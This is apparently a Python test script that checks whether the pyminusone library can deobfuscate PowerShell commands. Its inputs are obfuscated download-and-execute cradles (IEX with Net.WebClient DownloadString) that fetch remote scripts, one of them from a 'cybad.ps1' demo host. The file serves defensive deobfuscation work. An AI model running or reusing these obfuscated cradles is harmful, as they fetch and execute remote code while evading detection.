import pyminusone

# Teste 1: Comando que funciona
cmd1 = '("{1}{0}" -f \'x\',\'IE\') (&("{3}{2}{1}{0}"-f\'ct\',\'-Obje\',\'w\',\'Ne\') ("{0}{2}{1}"-f \'N\',\'nt\',\'et.WebClie\')).("{2}{0}{1}{3}"-f\'dSt\',\'rin\',\'Downloa\',\'g\').Invoke((\'\'\'tp://\',\'9\',\'\',\'git\',\'.ly/\',\'ht\'))'

print("=== Teste 1 (funciona) ===")
print(f"Input: {cmd1[:80]}...")
result1 = pyminusone.deobfuscate_powershell(cmd1)
print(f"Output: {result1}")
print(f"Sucesso: {len(result1) < len(cmd1) * 0.8}")
print()

# Teste 2: Comando problemático (sem normalização)
cmd2 = '&("{1}{0}" -f \'EX\',\'I\')(&("{1}{0}{2}"-f \'Obje\',\'New-\',\'ct\') ("{1}{4}{3}{0}{2}" -f\'Clie\',\'N\',\'nt\',\'t.Web\',\'e\')).("{1}{3}{0}{2}" -f \'trin\',\'Downl\',\'g\',\'oadS\').Invoke(("{1}{5}{2}{4}{3}{0}" -f \'l/cybad.ps1\',\'h\',\'ww\',\'loca\',\'w.demo.\',\'ttp://\'))'

print("=== Teste 2 (sem normalização) ===")
print(f"Input: {cmd2[:80]}...")
result2 = pyminusone.deobfuscate_powershell(cmd2)
print(f"Output: {result2}")
print(f"Sucesso: {len(result2) < len(cmd2) * 0.8}")
print()

# Teste 3: Verificar se o problema é o & no início
cmd3 = '("{1}{0}" -f \'EX\',\'I\')(&("{1}{0}{2}"-f \'Obje\',\'New-\',\'ct\') ("{1}{4}{3}{0}{2}" -f\'Clie\',\'N\',\'nt\',\'t.Web\',\'e\')).("{1}{3}{0}{2}" -f \'trin\',\'Downl\',\'g\',\'oadS\').Invoke(("{1}{5}{2}{4}{3}{0}" -f \'l/cybad.ps1\',\'h\',\'ww\',\'loca\',\'w.demo.\',\'ttp://\'))'

print("=== Teste 3 (sem & no início) ===")
print(f"Input: {cmd3[:80]}...")
result3 = pyminusone.deobfuscate_powershell(cmd3)
print(f"Output: {result3}")
print(f"Sucesso: {len(result3) < len(cmd3) * 0.8}")
print()

# Teste 4: Formato mais simples
cmd4 = '("{1}{0}" -f \'EX\',\'I\')'
print("=== Teste 4 (simples) ===")
print(f"Input: {cmd4}")
result4 = pyminusone.deobfuscate_powershell(cmd4)
print(f"Output: {result4}")
print(f"Sucesso: {result4.strip() == 'IEX' or result4.strip() == '"IEX"'}")
